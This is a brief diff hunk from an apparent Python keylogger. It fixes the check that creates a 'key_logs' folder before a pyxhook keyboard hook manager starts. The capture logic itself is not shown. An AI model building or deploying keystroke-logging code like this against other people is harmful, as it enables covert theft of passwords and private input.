@@ -16,7 +16,7 @@ def kbevent( event ):
 		
 if __name__ == '__main__':
 
-	if not os.path.isfile('key_logs'):
+	if not os.path.isdir('key_logs'):
 		os.mkdir('key_logs')
 	try:
 		hookman = pyxhook.HookManager()
